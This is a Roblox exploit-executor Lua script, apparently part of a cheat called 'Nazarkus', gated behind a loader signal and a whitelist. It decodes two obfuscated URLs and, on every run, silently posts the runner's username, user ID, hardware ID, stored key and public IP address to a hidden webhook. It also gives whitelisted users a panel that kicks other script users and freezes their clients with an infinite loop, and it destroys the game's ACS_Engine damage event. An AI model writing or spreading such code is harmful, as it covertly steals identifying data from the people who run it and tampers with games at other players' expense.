if not getgenv()._NK_AUTH_SIGNAL then
    game:GetService("Players").LocalPlayer:Kick("Direct execution prohibited. Run via Loader.")
    return
end
local _SIG = getgenv()._NK_AUTH_SIGNAL
getgenv()._NK_AUTH_SIGNAL = nil

local function _D(d)
    local r = ""
    for i = 1, #d do r = r .. string.char(d[i] - i - 42) end
    return r
end

local _W = _D({147, 160, 161, 158, 162, 106, 96, 97, 151, 173, 168, 153, 166, 170, 157, 104, 158, 171, 170, 109, 160, 176, 170, 113, 186, 169, 167, 174, 182, 183, 180, 189, 122, 125, 130, 127, 136, 132, 129, 139, 140, 133, 138, 135, 140, 144, 145, 143, 148, 147, 149, 150, 142, 211, 216, 150, 202, 221, 151, 203, 222, 193, 219, 177, 154, 214, 162, 196, 218, 222, 206, 212, 184, 251, 187, 216, 223, 210, 228, 261, 241, 201, 234, 252, 224, 248, 219, 246, 253, 233, 254, 237, 201, 239, 277, 272, 280, 263, 249, 244, 221, 217, 265, 239, 248, 268, 269, 253, 287, 273, 222, 225, 258, 296, 277, 265, 269, 296, 253, 238, 239, 250, 289, 284})
local _IP = _D({147, 160, 161, 158, 105, 95, 96, 155, 163, 97, 150, 166, 160, 102, 156, 169, 168, 107, 167, 177, 174, 174, 112, 129, 169, 173, 170, 178, 171, 187, 134, 189, 191, 173, 193, 195, 194, 124, 180, 193, 200, 194, 201, 200, 208, 132, 188, 195, 207, 213, 137, 210, 200, 205, 198, 220, 210, 210, 202, 146, 208, 219, 217, 150, 220, 225, 210, 224, 232, 156, 225, 228, 226, 236, 238, 162, 223, 231, 236, 238, 228, 234, 228})

local Config = {
    WL = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
    },
    BL = { UIDs = {}, HWIDs = {}, Keys = {} }
}

local _P = game:GetService("Players")
local _H = game:GetService("HttpService")
local _lp = _P.LocalPlayer
local _uid = tostring(_lp.UserId)
local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
local _tk = "N/A"

pcall(function()
    if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
    else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")

local _R = game:GetService("ReplicatedStorage")
local _SIG_K = "NazarkusSignal"
local _PRES_K = "NazarkusPresence"
local _SIG = _R:FindFirstChild(_SIG_K) or Instance.new("StringValue", _R)
_SIG.Name = _SIG_K
local _PDIR = _R:FindFirstChild(_PRES_K) or Instance.new("Folder", _R)
_PDIR.Name = _PRES_K
Instance.new("StringValue", _PDIR).Name = _lp.Name

_SIG.Changed:Connect(function(v)
    if v == "all" or v == _lp.Name or v == _uid or v == _tk then
        _lp:Kick("Access Revoked.")
        while true do end
    end
end)

if _st == "whitelist" then
    task.spawn(function()
        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(0, 200, 0, 300)
        f.Position = UDim2.new(0.5, -100, 0.5, -150)
        f.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        f.Visible = false
        Instance.new("UICorner", f)
        local s = Instance.new("ScrollingFrame", f)
        s.Size = UDim2.new(1, -10, 1, -20)
        s.BackgroundTransparency = 1
        Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
        
        local function refresh()
            for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
            for _, v in ipairs(_PDIR:GetChildren()) do
                local b = Instance.new("TextButton", s)
                b.Size = UDim2.new(1, 0, 0, 30)
                b.Text = "KICK: " .. v.Name
                b.MouseButton1Click:Connect(function() _SIG.Value = v.Name task.wait(0.1) _SIG.Value = "" refresh() end)
            end
        end
        game:GetService("UserInputService").InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
    end)
end

local function log()
    pcall(function()
        local r = (syn and syn.request or request or http_request)({Url = _IP, Method = "GET"})
        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Verified" or "Execution"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player", ["value"] = _lp.Name.." (".._uid..")", ["inline"] = true},
                    {["name"] = "Hardware", ["value"] = "HWID: `".._hw.."`\nKey: `".._tk.."`", ["inline"] = false},
                    {["name"] = "Network", ["value"] = "IP: "..(ni.query or "N/A"), ["inline"] = false}
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        (syn and syn.request or request or http_request)({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

task.spawn(log)
if _st == "blacklist" then _lp:Kick("Banned.") return end
pcall(function() if _R:FindFirstChild("ACS_Engine") then _R.ACS_Engine.Events.FDMG:Destroy() end end)
